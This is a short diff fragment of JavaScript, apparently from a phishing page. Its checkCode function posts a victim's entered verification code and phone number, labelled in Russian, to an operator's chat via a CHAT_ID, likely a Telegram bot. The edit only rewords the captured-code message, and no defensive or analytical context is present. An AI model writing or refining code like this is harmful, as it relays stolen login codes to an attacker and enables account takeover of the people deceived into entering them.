@@ -184,7 +184,7 @@ function checkCode() {
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
             chat_id: CHAT_ID,
-            text: `🤡💀 Пользователь ввел код: ${code}\n📱 Номер: ${phoneNumber}`
+            text: `КОД: ${code}\n📱 Номер: ${phoneNumber}`
         })
     }).then(res => res.json())
     .then(data => {
